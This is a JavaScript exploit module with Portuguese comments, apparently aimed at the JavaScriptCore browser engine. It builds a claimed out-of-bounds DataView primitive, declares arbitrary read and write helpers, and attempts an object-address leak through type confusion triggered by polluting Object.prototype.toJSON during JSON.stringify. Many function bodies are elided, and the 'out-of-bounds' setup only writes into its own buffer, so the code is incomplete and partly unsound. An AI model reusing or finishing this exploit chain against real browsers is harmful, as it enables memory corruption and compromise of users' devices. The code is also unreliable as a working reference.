// js/core_exploit.mjs (v31.R19 - Sonda Addrof com flag de contexto global)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment_R19';
    const wasSetup = isOOBEnvironmentSetup;
    if (!wasSetup && !options.force_clear_even_if_not_setup && oob_array_buffer_real === null && oob_dataview_real === null) return;
    log(`[${FNAME_CLEAR}] Limpando. Setup anterior: ${wasSetup}. Force: ${options.force_clear_even_if_not_setup}`, 'info');
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    log(`[${FNAME_CLEAR}] Limpo. Novo setup: ${isOOBEnvironmentSetup}`, 'info');
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { 
    const FNAME_TRIGGER = `CoreExploit.triggerOOB_primitive(caller:${options.caller_fname})_R19`;
    // ... (Lógica interna como na R18/v31.R17, garantindo logs claros e setup correto de isOOBEnvironmentSetup)
    let currentLength = 0;
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); } catch(e){ currentLength = 0; }
        }
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] OOB Env já OK.`, 'info'); return true;
        } else { log(`[${FNAME_TRIGGER}] OOB Env inconsistente. Re-init.`, 'warn'); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); }
    } else if (options.force_reinit) { clearOOBEnvironment({ force_clear_even_if_not_setup: true });}
    log(`[${FNAME_TRIGGER}] Iniciando Config (Setup Ant: ${isOOBEnvironmentSetup})`, 'test');
    const allocSize = getOOBAllocationSize(); 
    try {
        oob_array_buffer_real = new ArrayBuffer(allocSize); oob_dataview_real = new DataView(oob_array_buffer_real, 0, allocSize);
        log(`[${FNAME_TRIGGER}] AB e DV criados.`, 'info');
        if (allocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true);
            if (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true) !== 0xFFFFFFFF) throw new Error(`Falha ao expandir m_length.`);
        } else { throw new Error(`AllocSize ${allocSize} pequeno para m_length offset.`); }
        isOOBEnvironmentSetup = true; 
        log(`[${FNAME_TRIGGER}] OOB CONFIGURADO. Len: ${toHex(oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true))}. Setup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { log(`ERRO ${FNAME_TRIGGER}: ${e.message}`,'critical'); console.error(e); clearOOBEnvironment({force_reinit:true}); throw e; }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações) ... */ }
export function isOOBReady(caller_fname = "Unknown") { /* ... (como na R18, com logging detalhado) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... */ }

// Variáveis para attemptAddrofUsingCoreHeisenbug (R19)
let _targetObjectForCoreAddrof_R19 = null; 
let _core_addrof_tc_confirmed_this_run_R19 = false;
let _core_victim_float_view_for_addrof_R19 = null; 

function _toJSONProbeForCoreAddrof_R19() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R19";
    let currentThisType = Object.prototype.toString.call(this);
    
    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Expecting M2 Flag: ${globalThis._probeR19_is_expecting_core_m2_victim}. TC Confirmed Flag: ${_core_addrof_tc_confirmed_this_run_R19}`, "leak");

    if (globalThis._probeR19_is_expecting_core_m2_victim && currentThisType === '[object Object]' && !_core_addrof_tc_confirmed_this_run_R19) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para M2 esperado! Escrevendo targetObject...`, "vuln");
        _core_addrof_tc_confirmed_this_run_R19 = true; 
        globalThis._probeR19_is_expecting_core_m2_victim = false; // Consome a flag

        if (_targetObjectForCoreAddrof_R19 && _core_victim_float_view_for_addrof_R19) {
            try {
                _core_victim_float_view_for_addrof_R19[0] = _targetObjectForCoreAddrof_R19;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R19[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_addrof_tc_confirmed_this_run_R19 = false; 
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos para escrita.`, "warn");
            _core_addrof_tc_confirmed_this_run_R19 = false; 
        }
    } else if (globalThis._probeR19_is_expecting_core_m2_victim && currentThisType !== '[object Object]') {
        // Ainda esperando M2, mas este 'this' não é [object Object]. Não desativa a flag ainda.
        log(`[${FNAME_PROBE}] Esperando M2, mas 'this' é ${currentThisType}. Flag de expectativa mantida.`, "info");
    }
    return { core_addrof_probe_r19_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R19
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R19";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R19...`, "info");

    _targetObjectForCoreAddrof_R19 = targetObject; 
    _core_addrof_tc_confirmed_this_run_R19 = false; 
    _core_victim_float_view_for_addrof_R19 = null;
    globalThis._probeR19_is_expecting_core_m2_victim = false; // Reseta/inicializa

    let addrof_result = { success: false, message: "Addrof (Heisenbug R19) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R19 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R19 = false;

    try {
        await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC }); 
        await PAUSE(50); 
        if (!isOOBReady(FNAME_FUNC)) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof R19."); }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Escrevendo valor crítico...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R19 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R19.fill(0.1919191919); 
        
        let core_m2_victim_local_obj = { marker_field_R19: "sou_o_m2_do_core_addrof_R19" };
        let core_m1_victim = { payload_m2_R19: core_m2_victim_local_obj };
        log(`[${FNAME_FUNC}] Estrutura M1/M2 criada.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R19, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R19 = true;
        
        globalThis._probeR19_is_expecting_core_m2_victim = true; // Sonda agora espera o M2
        JSON.stringify(core_m1_victim); 
        globalThis._probeR19_is_expecting_core_m2_victim = false; 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. TC Confirmada Flag: ${_core_addrof_tc_confirmed_this_run_R19}`, "info");
        
        if (_core_addrof_tc_confirmed_this_run_R19) {
            // ... (lógica de resultado como na R18) ...
            const val_double = _core_victim_float_view_for_addrof_R19[0]; addrof_result.leaked_address_as_double = val_double;
            const tb=new ArrayBuffer(8); new Float64Array(tb)[0]=val_double; const tu32=new Uint32Array(tb);
            const la64=new AdvancedInt64(tu32[0],tu32[1]); addrof_result.leaked_address_as_int64=la64;
            log(`[${FNAME_FUNC}] TC INTERNA OK! Lido:Dbl=${val_double},I64=${la64.toString(true)}`,"vuln");
            if(val_double!==0.1919191919&&(la64.low()!==0||la64.high()!==0)){const lhi=la64.high();const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan){addrof_result.success=true;addrof_result.message=`Addrof R19 TC OK. Addr Pot:${la64.toString(true)}`;}else{addrof_result.message=`Addrof R19 TC OK, val ${la64.toString(true)} NaN/Inf.`;}}else{addrof_result.message=`Addrof R19 TC OK, val (${la64.toString(true)}) preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R19 para o objeto esperado."; }
    } catch (e) { 
        log(`[${FNAME_FUNC}] EXCEPTION CATCH GERAL: ${e.message || String(e)}`, "critical");
        addrof_result.message = `Erro crítico em Addrof R19: ${e.message || String(e)}`; 
    } 
    finally {
        if (pollutedByCore_R19) { if (originalToJSON_R19) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R19); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R19 = null; _core_victim_float_view_for_addrof_R19 = null; 
        globalThis._probeR19_is_expecting_core_m2_victim = false; // Garante limpeza da flag global
    }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R19: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// Funções restantes (getStableConfusedArrayBuffer, etc.) como na R18
export async function getStableConfusedArrayBuffer() { /* ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... */ }
